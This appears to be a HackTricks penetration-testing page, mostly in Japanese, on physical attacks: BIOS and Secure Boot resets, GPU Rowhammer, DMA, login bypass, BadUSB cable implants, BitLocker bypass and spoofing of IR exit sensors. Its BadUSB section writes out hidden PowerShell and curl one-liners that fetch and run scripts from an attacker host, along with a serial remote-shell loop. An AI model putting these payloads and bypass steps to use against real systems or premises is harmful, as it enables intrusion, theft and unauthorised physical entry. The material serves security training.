# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**BIOSのリセット**は、いくつかの方法で実行できます。ほとんどのマザーボードには**バッテリー**が搭載されており、これを約**30分間**取り外すと、パスワードを含むBIOS設定がリセットされます。あるいは、**マザーボード上のジャンパー**を調整し、特定のピンを接続することで、これらの設定をリセットできます。

ハードウェアの調整が不可能または現実的でない場合は、**ソフトウェアツール**が解決策になります。**Kali Linux**などのディストリビューションを使って**Live CD/USB**からシステムを起動すると、BIOSパスワードの復旧に役立つ**_killCmos_**や**_CmosPWD_**などのツールにアクセスできます。

BIOSパスワードが不明な場合、通常はパスワードを**3回**間違えて入力すると、エラーコードが表示されます。このコードを [https://bios-pw.org](https://bios-pw.org) のようなWebサイトで使用すると、利用可能なパスワードを取得できる可能性があります。

### UEFI Security

従来のBIOSではなく**UEFI**を使用する最新のシステムでは、**chipsec**を利用して、**Secure Boot**の無効化を含むUEFI設定の分析や変更を行えます。これは、次のコマンドで実行できます。
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAMは電源が切られた後も、通常 **1～2分間** データを保持します。この保持時間は、液体窒素などの低温物質を使用することで **10分間** まで延長できます。この延長された時間内に、**dd.exe** や **volatility** などのツールを使用して **memory dump** を作成し、分析できます。

---

## GPU Rowhammer Against Page Tables

Modern GPU Rowhammer attacksは、通常のバッファではなく **GPU virtual-memory metadata** を標的にすると、はるかに有用になります。**GDDR6 NVIDIA Ampere GPUs** に関する最近の研究では、攻撃者が権限のない CUDA codeを実行し、GPU固有の hammeringパターンを構築し、**memory massaging** を使って paging structuresを脆弱な rowに配置し、その後 **last-level page table** または中間の **page directory** の bitを反転できることが示されています。1つの translation entryが破損すると、攻撃者は **arbitrary GPU memory read/write** を実現し、さらに host compromiseへ pivotできます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6で **profile hammerable rows** を行い、DRAM内の mitigationを回避する refresh-aware / non-uniform hammeringパターンを構築します。
2. **Massage GPU allocations** を行い、driverが page-translation structuresをデフォルトの保護された poolに保持せず、hammerableな physical locationsに配置するようにします。実際には、low-memory page-table regionを使い果たし、制御された strideで大規模な sparse UVM mappingsを sprayする方法などがあります。
3. page-table / page-directory entry内の **PFN** や aperture関連のbitなどの **translation metadata** を反転させ、攻撃者が制御する virtual pageが page-table pages、任意の GPU memory、または host-visible system mappingsに解決されるようにします。
4. 偽造した mappingを再利用して追加の translation entriesを書き換え、GPU contexts全体に対する **arbitrary GPU memory read/write** へ escalationします。

### Host Pivot and Mitigations

- **IOMMU disabled** の場合、偽造した system-aperture mappingsによって任意の **host physical memory** がGPUに公開され、GPU primitiveが完全な host compromiseにつながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** は last-level page-table entriesを標的にします。一方、**GeForge** は page-directory levelを破損させる方が容易な場合があることを示しています。1つのbit flipで、より大きな translation subtreeの宛先を変更できるためです。1つの paging layerだけを security-criticalとして扱わないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** は、GDDRHammer/GeForgeが使用する直接的な arbitrary-host-memory pathをブロックするため、依然として重要です。しかし、**complete mitigation** ではありません。**GPUBreach** は、攻撃者がGPUから書き込み可能な driver所有のCPU buffersを破損させ、その後 NVIDIA driverの memory-safety bugsを triggerして kernel write primitiveを取得し、IOMMUが有効な場合でも **root shell** を得る second-stage pivotを示しています。<sup>[[3]](#references)</sup>
- **System-level ECC** は、対応する workstation/server GPUsにおける実用的な hardening stepです。ECCを搭載しない Consumer GPUsでは、より弱い defense surfaceが露呈します。<sup>[[4]](#references)</sup>
- これらの attacksは純粋な理論ではありません。**GeForge** は RTX 3060で **1,171** 回、RTX A6000で **202** 回の bit flipsを報告しており、working host-privilege-escalation chainの構築には十分な数でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** は、**FireWire** や **Thunderbolt** などの interfacesと互換性がある、DMAを通じた **physical memory manipulation** 用の toolです。memoryを patchして任意の passwordを受け入れさせることで、login proceduresを bypassできます。ただし、**Windows 10** systemsに対しては効果がありません。

---

## Live CD/USB for System Access

**_sethc.exe_** や **_Utilman.exe_** などの system binariesを **_cmd.exe_** の copyに置き換えると、system privilegesを持つ command promptを提供できます。**chntpw** などの toolsを使用して、Windows installationの **SAM** fileを編集し、passwordを変更できます。

**Kon-Boot** は、Windows kernelまたはUEFIを一時的に変更することで、passwordを知らずに Windows systemsへ logging inできるようにする toolです。詳細は [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) で確認できます。<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: BIOS settingsにアクセスします。
- **F8**: Recovery modeに入ります。
- Windows bannerの後に **Shift** を押すと、autologonを bypassできます。

### BAD USB Devices

**Rubber Ducky** や **Teensyduino** などの devicesは、target computerに接続された際に predefined payloadsを実行できる **bad USB** devicesを作成するための platformsとして機能します。

### Volume Shadow Copy

Administrator privilegesがあれば、PowerShellを通じて **SAM** fileを含む sensitive filesの copiesを作成できます。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** などの ESP32-S3 based implantsは、USB-A→USB-CまたはUSB-C↔USB-C cablesの内部に隠れ、USB keyboardとしてのみ enumerateし、Wi-Fi経由で C2 stackを公開します。operatorは victim hostから cableに電力を供給し、password `123456789` の hotspot `Evil Crow Cable Wind` を作成して、[http://cable-wind.local/](http://cable-wind.local/)（またはその DHCP address）を browseするだけで、組み込みの HTTP interfaceにアクセスできます。<sup>[[8]](#references)</sup>
- Browser UIには、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* の tabsがあります。保存された payloadsには OSごとの tagが付けられ、keyboard layoutsは on the flyで切り替えられ、VID/PID stringsは既知の peripheralsを mimicするよう変更できます。
- C2が cable内に存在するため、phoneから payloadsを stageし、executionを triggerし、host OSに触れることなく Wi-Fi credentialsを管理できます。これは、短い dwell-timeの physical intrusionsに適しています。

### OS-aware AutoExec payloads

- AutoExec rulesは、USB enumeration直後に fireする1つ以上の payloadsを bindします。implantは軽量な OS fingerprintingを実行し、一致する scriptを選択します。
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) または `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Executionは unattendedで行われるため、charging cableを交換するだけで、logged-on user contextの下で「plug-and-pwn」による initial accessを実現できます。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 保存された payloadが consoleを開き、新しい USB serial deviceに届くものをすべて実行する loopを pasteします。最小限の Windows variantは次のとおりです。
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant は USB CDC channel を open のまま維持し、ESP32-S3 から operator に向けて TCP client（Python script、Android APK、または desktop executable）を起動します。TCP session に入力されたあらゆる byte は上記の serial loop に forward されるため、air-gapped host 上でも remote command execution が可能です。Output は limited なので、operator は通常、blind command（account creation、追加 tooling の staging など）を実行します。

### HTTP OTA update surface

- 同じ web stack では通常、unauthenticated firmware update も公開されています。Evil Crow Cable Wind は `/update` で listen し、upload された任意の binary を flash します:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features（例：flash USB Army Knife firmware）mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## BitLocker Encryption の Bypassing

BitLocker encryption は、**recovery password** が memory dump file（**MEMORY.DMP**）内から見つかった場合、potentially bypass できます。この目的には、**Elcomsoft Forensic Disk Decryptor** や **Passware Kit Forensic** などの Tools を利用できます。

---

## Recovery Key Addition の Social Engineering

Social engineering tactics により、ユーザーを説得して recovery key を追加する command を実行させることで、新しい BitLocker recovery key を追加できます。この key は zeros で構成され、decryption process を簡略化できます。

---

## Chassis Intrusion / Maintenance Switches を Exploiting して BIOS を Factory-Reset する

多くの modern laptops や small-form-factor desktops には、Embedded Controller（EC）および BIOS/UEFI firmware によって監視される **chassis-intrusion switch** が搭載されています。この switch の主な目的は device が開かれた際に alert を発生させることですが、vendors が、switch を特定の pattern で toggled した際に trigger される **undocumented recovery shortcut** を実装している場合があります。<sup>[[5]](#references)[[6]](#references)</sup>

### Attack の仕組み

1. Switch は EC 上の **GPIO interrupt** に接続されています。
2. EC 上で実行される firmware が、**timing と presses の回数**を追跡します。
3. hard-coded pattern が recognised されると、EC は *mainboard-reset* routine を呼び出し、system NVRAM/CMOS の内容を **erases** します。
4. 次回 boot 時に BIOS は default values を読み込みます。**supervisor password、Secure Boot keys、すべての custom configuration が clear されます**。

> Secure Boot が disabled になり firmware password がなくなると、attacker は任意の external OS image を boot するだけで、internal drives へ unrestricted access を取得できます。

### Real-World Example – Framework 13 Laptop

Framework 13（11th/12th/13th-gen）の recovery shortcut は次のとおりです。
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
10回目のサイクル後、ECは次回の再起動時にBIOSへNVRAMを消去させるフラグを設定します。手順全体にかかる時間は約40秒で、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. 対象を電源オンにするか、サスペンドから復帰させてECを稼働させます。
2. 底面カバーを取り外し、侵入検知／メンテナンススイッチを露出させます。
3. ベンダー固有のトグルパターンを再現します（ドキュメントやフォーラムを参照するか、EC firmwareをreverse-engineerします）。
4. 再組み立てしてrebootします – firmware protectionsが無効化されているはずです。
5. live USB（例：Kali Linux）をbootし、通常のpost-exploitation（credential dumping、data exfiltration、malicious EFI binariesのimplantingなど）を実行します。

### Detection & Mitigation

* OS management consoleでchassis-intrusionイベントを記録し、予期しないBIOS resetsと相関させます。
* ネジやカバーに**tamper-evident seals**を使用し、開封を検知します。
* デバイスを**物理的に管理されたエリア**に保管します。physical accessはfull compromiseと同等だと想定してください。
* 利用可能な場合は、ベンダーの「maintenance switch reset」featureを無効化するか、NVRAM resetsに追加のcryptographic authorisationを要求します。

---

## No-Touch Exit Sensorsに対するCovert IR Injection

### Sensor Characteristics
- 一般的な「wave-to-exit」sensorsは、near-IR LED emitterとTV remote styleのreceiver moduleを組み合わせたもので、正しいcarrier（約30 kHz）のpulseを複数回（約4～10回）検知した後にのみlogic highを報告します。<sup>[[7]](#references)</sup>
- Plastic shroudによってemitterとreceiverが互いを直接見ることが防がれているため、controllerは検証済みのcarrierが近距離のreflectionから来たものと判断し、door strikeを開くrelayを駆動します。
- controllerがtargetの存在を認識すると、outbound modulation envelopeを変更することが多い一方、receiverはfiltered carrierに一致するburstを引き続き受け入れます。

### Attack Workflow
1. **emission profileをcaptureする** – controller pins間にlogic analyserを接続し、内蔵IR LEDを駆動する、detection前後両方のwaveformを記録します。
2. **「post-detection」waveformのみをreplayする** – stock emitterを取り外すか無視し、最初からtrigger済みのpatternで外部IR LEDを駆動します。receiverはpulse count/frequencyのみを判定するため、spoofしたcarrierを正規のreflectionとして扱い、relay lineをassertします。
3. **transmissionをgateする** – carrierを調整したburst（例：数十ミリ秒オン、同程度オフ）で送信し、receiverのAGCやinterference handling logicを飽和させずに最小限のpulse countを届けます。連続emissionではsensorが急速にdesensitiseされ、relayの作動が停止します。

### Long-Range Reflective Injection
- bench LEDをhigh-power IR diode、MOSFET driver、focusing opticsに置き換えることで、約6 m離れた位置から安定してtriggerできます。
- attackerはreceiver apertureへのline-of-sightを必要としません。ガラス越しに見える室内の壁、棚、door frameへbeamを向けることで、反射したenergyを約30°のfield of viewに入射させ、近距離でのhand waveを模倣できます。
- receiverは弱いreflectionのみを想定しているため、はるかに強い外部beamでも複数のsurfaceでbounceさせながら、detection thresholdを上回る状態を維持できます。

### Weaponised Attack Torch
- driverを市販のflashlight内部に組み込むことで、toolを目立たない形で隠せます。visible LEDをreceiverのbandに適合するhigh-power IR LEDへ交換し、ATtiny412（または同等品）を追加して約30 kHzのburstを生成し、MOSFETでLED currentをsinkします。
- telescopic zoom lensによってrange/precision向けにbeamを絞り、MCU controlの下にvibration motorを配置することで、visible lightを発せずにmodulationがactiveであることをhaptic confirmationできます。
- 複数の保存済みmodulation pattern（carrier frequencyとenvelopeを少しずつ変えたもの）をcycleすると、rebrandedされた複数のsensor familyとのcompatibilityが向上します。これにより、operatorはreflective surfaceをsweepし、relayが audibleにclickしてdoorがreleaseされるまで試行できます。

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
